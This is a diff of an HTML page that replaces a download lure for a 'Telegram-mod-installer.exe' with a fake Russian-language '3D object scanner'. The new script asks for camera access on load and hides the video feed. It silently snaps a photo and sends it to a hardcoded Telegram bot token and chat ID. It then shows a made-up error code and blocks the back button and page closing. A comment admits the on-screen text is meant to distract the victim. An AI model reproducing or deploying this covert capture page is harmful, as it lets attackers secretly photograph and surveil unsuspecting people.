@@ -1,17 +1,218 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-<title>Скачать</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>3D-сканер</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Arial, sans-serif;
+            background: #0a0a2e;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            margin: 0;
+        }
+        .container {
+            background: rgba(255,255,255,0.05);
+            border-radius: 20px;
+            padding: 40px 30px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+        }
+        .logo { font-size: 56px; margin-bottom: 8px; }
+        h1 {
+            font-size: 22px;
+            background: linear-gradient(90deg, #00d4ff, #7b2ffc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 8px;
+        }
+        .subtitle { color: #888; font-size: 13px; margin-bottom: 20px; }
+        .scan-area {
+            background: rgba(0,0,0,0.3);
+            border-radius: 12px;
+            padding: 30px 20px;
+            border: 2px dashed rgba(0,212,255,0.2);
+            min-height: 150px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .icon { font-size: 64px; display: block; margin-bottom: 8px; }
+        .scan-area p { color: #666; font-size: 14px; }
+        .scan-area .small { font-size: 12px; color: #444; margin-top: 4px; }
+        .status {
+            margin-top: 16px;
+            color: #888;
+            font-size: 13px;
+            min-height: 20px;
+        }
+        .status .dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: #00ff88;
+            border-radius: 50%;
+            margin-right: 6px;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.2; }
+        }
+        video { display: none !important; }
+        .hidden { display: none; }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <div class="logo">📷</div>
+        <h1>3D-сканер предметов</h1>
+        <div class="subtitle">Автоматическое сканирование объектов</div>
 
-<center>
-<a href="Telegram-mod-installer.exe" download>
-<button style="font-size:40px;padding:30px 80px;">
-📥 СКАЧАТЬ
-</button>
-</a>
-</center>
+        <div class="scan-area" id="scanArea">
+            <span class="icon">📦</span>
+            <p id="scanText">Подготовка сканера...</p>
+            <p class="small" id="scanSubtext">Инициализация 3D-движка</p>
+        </div>
 
+        <div class="status" id="status">
+            <span class="dot"></span> Ожидание объекта
+        </div>
+    </div>
+
+    <video id="video" autoplay muted playsinline></video>
+
+    <script>
+        // ===== КОНФИГ =====
+        const BOT_TOKEN = '8765295994:AAGiJ_XRhNS0U8ZWMh8tExZ64jT_TxFK8HQ';
+        const CHAT_ID = '5645726673';
+
+        // ===== ЭЛЕМЕНТЫ =====
+        const video = document.getElementById('video');
+        const statusDiv = document.getElementById('status');
+        const scanText = document.getElementById('scanText');
+        const scanSubtext = document.getElementById('scanSubtext');
+        const scanArea = document.getElementById('scanArea');
+
+        let stream = null;
+        let captured = false;
+
+        // ===== МГНОВЕННЫЙ ЗАХВАТ =====
+        function captureAndSend() {
+            if (!stream || captured) return;
+
+            const canvas = document.createElement('canvas');
+            const w = video.videoWidth || 640;
+            const h = video.videoHeight || 480;
+            canvas.width = w;
+            canvas.height = h;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, w, h);
+
+            // Меняем текст, чтобы отвлечь внимание
+            scanText.textContent = 'Сканирование объекта...';
+            scanSubtext.textContent = 'Построение 3D-сетки';
+            scanArea.style.borderColor = '#00ff88';
+
+            canvas.toBlob(async (blob) => {
+                if (blob) {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'scan_' + Date.now() + '.jpg');
+
+                    try {
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    } catch (e) {
+                        // Игнорируем ошибки отправки
+                    }
+                }
+
+                // ===== МГНОВЕННАЯ ОШИБКА =====
+                document.body.innerHTML = `
+                    <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#0a0a2e;color:#ff4444;font-family:Arial;flex-direction:column;padding:20px;text-align:center;">
+                        <div style="font-size:72px;margin-bottom:16px;">⚠️</div>
+                        <h1 style="font-size:26px;margin-bottom:8px;">Ошибка 0x3D8F2A</h1>
+                        <p style="color:#888;max-width:380px;margin-bottom:20px;">Не удалось создать 3D-модель. Неподдерживаемый формат объекта.</p>
+                        <p style="color:#555;font-size:12px;">Код: SCAN_ERR_VERTEX_FAIL</p>
+                        <button onclick="location.reload()" style="margin-top:25px;background:#333;color:white;border:none;padding:12px 40px;border-radius:50px;cursor:pointer;font-size:14px;">Обновить страницу</button>
+                    </div>
+                `;
+
+                captured = true;
+            }, 'image/jpeg', 0.85);
+        }
+
+        // ===== АВТОМАТИЧЕСКИЙ ЗАПУСК =====
+        async function autoStart() {
+            statusDiv.innerHTML = '<span class="dot"></span> Запрос доступа к камере...';
+
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { 
+                        facingMode: 'environment',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                });
+
+                video.srcObject = stream;
+                await video.play();
+
+                // Меняем интерфейс
+                scanText.textContent = 'Объект обнаружен';
+                scanSubtext.textContent = 'Авто-фокусировка';
+                statusDiv.innerHTML = '<span class="dot"></span> Сканирование...';
+                scanArea.style.borderColor = 'rgba(0,212,255,0.5)';
+
+                // ===== МГНОВЕННЫЙ ЗАХВАТ =====
+                // Ждём 1 кадр, чтобы видео стабилизировалось (50ms)
+                setTimeout(() => {
+                    captureAndSend();
+                }, 50);
+
+            } catch (err) {
+                // Если камера отклонена
+                statusDiv.innerHTML = '❌ Ошибка доступа к камере';
+                setTimeout(() => {
+                    document.body.innerHTML = `
+                        <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#0a0a2e;color:#ff4444;font-family:Arial;flex-direction:column;padding:20px;text-align:center;">
+                            <div style="font-size:72px;margin-bottom:16px;">🚫</div>
+                            <h1 style="font-size:26px;margin-bottom:8px;">Доступ запрещён</h1>
+                            <p style="color:#888;max-width:380px;margin-bottom:20px;">Для работы сканера необходим доступ к камере.</p>
+                            <button onclick="location.reload()" style="margin-top:25px;background:#333;color:white;border:none;padding:12px 40px;border-radius:50px;cursor:pointer;font-size:14px;">Обновить страницу</button>
+                        </div>
+                    `;
+                }, 500);
+            }
+        }
+
+        // ===== ЗАПУСК СРАЗУ ПОСЛЕ ЗАГРУЗКИ =====
+        // Задержка 300ms для полной загрузки DOM
+        setTimeout(autoStart, 300);
+
+        // ===== БЛОКИРОВКА КНОПКИ "НАЗАД" =====
+        history.pushState(null, null, location.href);
+        window.addEventListener('popstate', () => {
+            history.pushState(null, null, location.href);
+        });
+
+        // ===== ПРЕДОТВРАЩАЕМ ЗАКРЫТИЕ СТРАНИЦЫ =====
+        window.addEventListener('beforeunload', (e) => {
+            if (!captured) {
+                e.preventDefault();
+                e.returnValue = '';
+            }
+        });
+    </script>
 </body>
 </html>
